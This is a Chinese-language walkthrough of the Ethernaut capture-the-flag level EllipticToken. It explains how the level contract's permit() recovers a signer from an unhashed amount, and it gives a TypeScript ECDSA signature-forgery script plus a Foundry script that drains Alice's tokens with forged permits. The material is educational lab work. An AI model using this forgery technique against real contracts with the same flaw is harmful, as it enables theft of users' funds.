# Ethernaut 第35关：EllipticToken

---

> “不要为恶所胜，反要以善胜恶。”——《罗马书》12:21

在本关游戏中，我们需要窃取 Alice（地址：`0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e`）刚刚兑换的所有代币。

合约代码：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Ownable} from "openzeppelin-contracts-08/access/Ownable.sol";
import {ECDSA} from "openzeppelin-contracts-08/utils/cryptography/ECDSA.sol";
import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract EllipticToken is Ownable, ERC20 {
    error HashAlreadyUsed();
    error InvalidOwner();
    error InvalidReceiver();
    error InvalidSpender();

    constructor() ERC20("EllipticToken", "ETK") {}

    mapping(bytes32 => bool) public usedHashes;

    function redeemVoucher(
        uint256 amount,
        address receiver,
        bytes32 salt,
        bytes memory ownerSignature,
        bytes memory receiverSignature
    ) external {
        bytes32 voucherHash = keccak256(abi.encodePacked(amount, receiver, salt));
        require(!usedHashes[voucherHash], HashAlreadyUsed());

        // 验证凭证由所有者签发
        require(ECDSA.recover(voucherHash, ownerSignature) == owner(), InvalidOwner());

        // 验证接收者已接受该凭证
        require(ECDSA.recover(voucherHash, receiverSignature) == receiver, InvalidReceiver());

        // 作废该凭证
        usedHashes[voucherHash] = true;

        // 铸造代币
        _mint(receiver, amount);
    }

    function permit(uint256 amount, address spender, bytes memory tokenOwnerSignature, bytes memory spenderSignature)
        external
    {
        bytes32 permitHash = keccak256(abi.encode(amount));
        require(!usedHashes[permitHash], HashAlreadyUsed());
        require(!usedHashes[bytes32(amount)], HashAlreadyUsed());

        // 恢复签发该授权的代币所有者地址
        address tokenOwner = ECDSA.recover(bytes32(amount), tokenOwnerSignature);

        // 验证授权已被花费者接受
        bytes32 permitAcceptHash = keccak256(abi.encodePacked(tokenOwner, spender, amount));
        require(ECDSA.recover(permitAcceptHash, spenderSignature) == spender, InvalidSpender());

        // 作废该授权
        usedHashes[permitHash] = true;

        // 授权花费者
        _approve(tokenOwner, spender, amount);
    }
}
```

### 合约分析

每个包含接收者信息的凭证都会被哈希处理，该消息哈希需由代币所有者（Bob）和接收者（Alice）在链下签名。通过 `ECDSA.recover` 进行链上验证后，若两次验证均通过，接收者将获得签名对应的代币数量。

在 `permit` 函数中，`tokenOwner`（代币所有者）和 `spender`（花费者）也需通过签名验证以获取代币授权。

由于 Alice 的 Elliptic 代币（ETK）余额大于 0，说明 `redeemVoucher()` 至少已被调用过一次（且 Alice 为接收者），因此必然存在相关交易痕迹。但合约通过 `usedHashes` 映射防止重复使用相同的消息哈希，因此无法通过伪造签名（或“冒充者”攻击）复用同一哈希值。

该合约看似无懈可击，如何实现攻击呢？深入分析 `permit` 函数后，会发现一处异常：

代码行 `address tokenOwner = ECDSA.recover(bytes32(amount), tokenOwnerSignature);` 中，`recover` 函数并未传入**哈希后的消息**！而是直接将 `bytes32(amount)` 作为“消息哈希”传入，未经过任何实际加密处理——这与常规做法不符。

如何利用该漏洞？我们先搁置这个问题，先看第一步可以做什么。

### 凭证哈希（voucherHash）与 Alice 的签名

`redeemVoucher()` 已被调用过一次，我们可以通过该交易哈希在 Sepolia Etherscan 上查询更多信息（如输入参数），潜在获取公开的 `voucherHash` 以及 Alice 对该消息哈希的签名。

访问实例地址页面，进入“内部交易”标签页，会看到如下内容：

![](image_Explorer.png)

最后两笔从关卡地址指向 address(1) 的交易是关键——调用 `ECDSA.recover()` 时，会向以太坊预编译合约（地址恰好为 address(1)）发起静态调用。关于预编译合约的更多信息，可参考 [此链接](https://lucasmartincalderon.medium.com/exploring-precompiled-contracts-on-ethereum-a-deep-dive-4e9f9682e0aa)。此外，[Ethernaut 第32关“Impersonator”](https://ethernaut.openzeppelin.com/) 也包含 `ecrecover` 的底层实现案例。

因此，**最后一笔交易**对应代码行 `require(ECDSA.recover(voucherHash, receiverSignature) == receiver, InvalidReceiver());`——即验证所有者（Bob）签名后，再次调用 `ECDSA.recover` 验证接收者签名。查看该交易的输入数据，可提取编码后的 `(voucherHash, receiverSignature)`：

输入数据：
```
0x87f1c8cd4c0e19511304b612a9b4996f8c2bd795796636bd25812cd5b0b6a973000000000000000000000000000000000000000000000000000000000000001cab1dcd2a2a1c697715a62eb6522b7999d04aa952ffa2619988737ee675d9494f2b50ecce40040bcb29b5a8ca1da875968085f22b7c0a50f29a4851396251de12
```

由此提取：
- `voucherHash`：`0x87f1c8cd4c0e19511304b612a9b4996f8c2bd795796636bd25812cd5b0b6a973`
- Alice 的签名：`0xab1dcd2a2a1c697715a62eb6522b7999d04aa952ffa2619988737ee675d9494f2b50ecce40040bcb29b5a8ca1da875968085f22b7c0a50f29a4851396251de121c`（注：已将 v 值（0x1c）移至末尾，确保 `recover` 函数接收正确的输入顺序（r, s, v））

另一种更直接的获取方式（略带“作弊”性质）：查看 Ethernaut 的源码工厂文件（[EllipticTokenFactory.sol](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/levels/EllipticTokenFactory.sol)），可在 `createInstance` 函数中直接找到这两个字节变量。

### Alice 的公钥

已知（消息哈希，签名）对后，可恢复 Alice 的公钥。公式如下：
$$
P = r^{-1} (sR - zG)
$$

参数说明：
- `r`：由签名生成时使用的曲线点 x 坐标推导得出
- `s`：基于签名生成过程中使用的秘密值和消息哈希计算得出
- `R`：可通过 `r` 坐标在椭圆曲线上找到的点
- `z`：消息哈希
- `G`：椭圆曲线的生成元

验证公钥正确性的方法：对该公钥进行 Keccak-256 哈希，结果的最后 20 字节应与 Alice 的地址一致。可使用 [Keccak256 计算器](https://emn178.github.io/online-tools/keccak_256.html) 验证。

### 签名验证

进入下一环节前，需了解椭圆曲线密码学（ECC）中**签名验证**的背景知识。假设已获取公钥 `P`、签名（r, s）和消息哈希 `z`，验证流程如下：

1. 计算 $u_1 = s^{-1}z\mod n$ 和 $u_2 = s^{-1} r \mod n$（其中 n 为椭圆曲线的阶）
2. 计算 $Q = u_1G + u_2P$，若 $r == x(Q)\mod n$，则签名有效

该验证方法基于签名（r, s）的生成逻辑——由公钥 `P`、私钥 `e`、随机秘密值 `k` 和消息哈希 `z` 计算得出。关于 ECDSA 的更多细节，可参考 [维基百科](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm)。

### 签名伪造

现在我们可以回答之前留下的问题：我们如何利用这个漏洞（未哈希的消息哈希）呢？答案是**签名伪造**。在签名伪造中，我们使用公钥和一个公共的（签名/消息哈希）对来*伪造*一个并非由原签名者创建的（签名/消息哈希）对。我们可以简单地让`u1`和`u2`随机取值，以生成尽可能多的对。现在我们有了伪造的消息哈希，由于那个`bytes32(amount)`根本没有经过哈希处理，它极易受到**暴力破解**攻击，因为我们有许多伪造的对。以下是逐步的方法：

1. 使用已知的签名和消息哈希进行公钥恢复（$P = r^{-1}(sR - zG)$）。
2. 随机选择`0 <= u1 < n`和`0 < u2 < n`。（`u2!= 0`，因为我们需要计算它的逆）。
3. $Q = u_1G + u_2P$，$r' = x(Q)\mod n$，（$r' \neq 0$）。
4. 计算$u_2^{-1} \mod n = u_2Inv$，$s = r * u_2Inv \mod n$。（$s' \neq 0$）。
5. 根据$y(Q)$、$r'$、$s'$确定$v$。
6. $z = (u_1 * s \mod n)$。
7. 将`z`直接与爱丽丝的余额（10以太）进行比较。如果它大于该值，这意味着我们可以假装爱丽丝允许我们这笔金额。如果它小于10以太，选择不同的（`u1`，`u2`）对并从步骤3重新开始。

`signature_spoofing.ts`：
```typescript
import { 
  bytesToBigInt, 
  recoverPublicKey, 
  serializeSignature, 
  toHex, 
  verifyHash, 
  type Hex,
} from "viem";
import { publicKeyToAddress } from "viem/accounts";
import { secp256k1 } from "@noble/curves/secp256k1.js";
import { randomBytes } from "crypto";

const N = BigInt(
  "0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141",
);

// ---------- 辅助函数 ----------

/// @notice 计算 `a mod m` 作为一个非负的大整数。
/// @dev 修正JavaScript的 `%` 余数运算符，它可能返回负值。
///      返回 `r`，使得 `0 <= r < m` 且 `r ≡ a (mod m)`。
/// @param a 被除数（可以为负数）。
/// @param m 模数（必须为正数且非零）。
/// @return `a` 模 `m` 的规范正余数。
function mod(a: bigint, m: bigint): bigint {
  const r = a % m;
  return r >= 0n ? r : r + m;
}

/// @notice 计算 `a` 模 `m` 的模逆。
/// @dev 使用扩展欧几里得算法找到 `x`，使得 `(a * x) % m == 1`。
///      要求 `a` 和 `m` 互质；否则，不存在逆。
/// @param a 要取逆的值。
/// @param m 模数（必须为正数且非零）。
/// @return `a` 模 `m` 的模逆。
function invMod(a: bigint, m: bigint): bigint {
  let t = 0n, newT = 1n;
  let r = m, newR = mod(a, m);
  while (newR !== 0n) {
    const q = r / newR;
    [t, newT] = [newT, t - q * newT];
    [r, newR] = [newR, r - q * newR];
  }
  if (r !== 1n) throw new Error("逆不存在");
  if (t < 0n) t += m;
  return t;
}

/// @notice 生成一个在范围 `[1, N-1]` 内的随机标量值。
/// @dev 使用加密安全的随机字节生成椭圆曲线操作的有效标量。
///      确保标量非零且在模 `N` 下均匀分布。
/// @return 一个随机大整数 `s`，使得 `1 <= s < N`。
function randomScalar(): bigint {
  while (true) {
    const rb = randomBytes(32);
    const k = bytesToBigInt(rb);
    const s = mod(k, N - 1n) + 1n; // 1..n-1
    if (s !== 0n) return s;
  }
}

/// @notice 演示签名伪造例程。
/// @dev 从给定的 `(hash, signature)` 对中恢复公钥并执行
///      椭圆曲线操作以导出相关参数。此示例仅用于
///      教育或防御用途；不应在生产代码中用于生成或修改签名。
/// @param hash 已签名的消息哈希（32字节值）。
/// @param signature 对应于 `hash` 的现有ECDSA签名。
/// @return pubkeyHex 作为十六进制字符串的恢复的未压缩公钥。
/// @return r 结果曲线点的x坐标。
/// @return s 以规范形式计算的签名参数。
/// @return v 以太坊风格的恢复ID（27或28）。
/// @return e 计算的辅助消息哈希值。
/// @return signature 以十六进制格式序列化的 `(r, s, v)` 签名。
async function signatureSpoofing({
  hash,
  signature,
}: {
  hash: Hex;
  signature: Hex;
}) {
    // 恢复公钥（应为未压缩）
    const pubkeyHex = await recoverPublicKey({
        hash,
        signature,
    });
    // 从公钥构建 P
    const P = secp256k1.Point.fromHex(pubkeyHex.slice(2));
    const G = secp256k1.Point.BASE;
    while (true) {
        // 随机 u1 和 u2 
        const u1 = randomScalar();
        const u2 = randomScalar();
        if (u2 === 0n) continue; // u2 必须非零，因为我们需要计算它的逆
        // Q = u1*G + u2*P
        const Q = G.multiply(u1).add(P.multiply(u2));
        const {x, y} = Q.toAffine();
        const r = mod(x, N);
        if (r === 0n) continue; // r 必须非零，因为它是签名的一部分
        const u2Inv = invMod(u2, N); // 计算 u2 的逆 (u2Inv = 1/u2 mod N)
        let s = mod(r * u2Inv, N); // s = r/u2 mod N
        if (s === 0n) continue; // s 必须非零，因为它是签名的一部分
        let yParity = Number(y & 1n);
        // 强制低S规范形式
        if (s > N / 2n) {
        s = N - s;
        yParity ^= 1; // 因为我们取反了 s，所以翻转奇偶性
        }
        const v = 27 + yParity; // 以太坊风格的 v
        // 计算消息哈希: z = (u1 * s) mod N = (u1 * (r/u2 mod N)) mod N
        const z = mod(r * mod(u1 * u2Inv, N), N);
        if (z < 10 ** 18) continue; // 确保 z 高于爱丽丝的余额
        // 序列化签名
        const generatedSignature = serializeSignature({
            r: toHex(r),
            s: toHex(s),
            v: BigInt(v),
        });
        return {
            pubkeyHex,
            r,
            s,
            v,
            z,
            signature: generatedSignature,
        };
    }
}

async function main() {
    const hash =
        "0x87f1c8cd4c0e19511304b612a9b4996f8c2bd795796636bd25812cd5b0b6a973";
    const signature =
        "0xab1dcd2a2a1c697715a62eb6522b7999d04aa952ffa2619988737ee675d9494f2b50ecce40040bcb29b5a8ca1da875968085f22b7c0a50f29a4851396251de121c";
    const out = await signatureSpoofing({ hash, signature });
    const pubkeyHex = out.pubkeyHex;
    const address = publicKeyToAddress(pubkeyHex);
    const messageHash = toHex(out.z);
    const serializedSignature = out.signature;
    console.log("公钥:", pubkeyHex);
    console.log("地址:", address); // 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e (爱丽丝)
    console.log("消息哈希:", messageHash);
    console.log("签名 (r||s||v):", serializedSignature);
    console.log(
        "验证:",
        await verifyHash({
            hash: messageHash,
            signature: serializedSignature,
            address,
        }),
    );
}
main().catch((err) => {
    console.error(err);
    process.exit(1);
});
```

这段脚本参考自[这里](https://github.com/piatoss3612/Ethernaut/blob/main/script/signature_spoofing.ts)。我们用yarn运行这个脚本并得到输出：

![](image_Shell.png)

然后我们可以在Solidity脚本中复制消息哈希和签名：

`EllipticToken.s.sol`：

```solidity
// SPDX - 许可证 - 标识符：MIT
pragma solidity 0.8.28;

import {Script, console} from "forge - std/Script.sol";
import {IEllipticToken} from "../src/IEllipticToken.sol";

contract EllipticTokenScript is Script {
    address tokenAddress = 0x96D52a815b56d80890bdC627458d623b9cD62874;
    address tokenOwner = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;
    IEllipticToken token = IEllipticToken(tokenAddress);

    function run() external {
        vm.startBroadcast();
        uint256 amount = uint256(0x1176ea0c3e05d106665d9ce306359578b32fd2441e7234a6f1cc2218676f346a);
        bytes memory tokenOwnerSignature = 
            hex"aba231ba9cb786c65abe725bcf4785b2db4825d8506a3c493fa3edab685d6ee86249c4f865276652d8e2dbcf1957ffacd21a1635b993286f9a1fefd1afe24fae1c";

        bytes32 permitAcceptHash = keccak256(abi.encodePacked(tokenOwner, msg.sender, amount));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(msg.sender, permitAcceptHash);
        bytes memory spenderSignature = abi.encodePacked(r, s, v);

        token.permit(amount, msg.sender, tokenOwnerSignature, spenderSignature);
        bool success = token.transferFrom(tokenOwner, msg.sender, token.balanceOf(tokenOwner));
        require(success, "Transfer failed");

        console.log("爱丽丝的ETK余额:", token.balanceOf(tokenOwner));
        vm.stopBroadcast();
    }
}
```

注意，我们可以在foundry中使用作弊码`vm.sign`用外部拥有账户（EOA）对消息进行签名。关于整个代码库，你可以查看这里：

([Github-link-for-solution](https://github.com/EEexplorer001/ethernaut-level-35-elliptic-token))
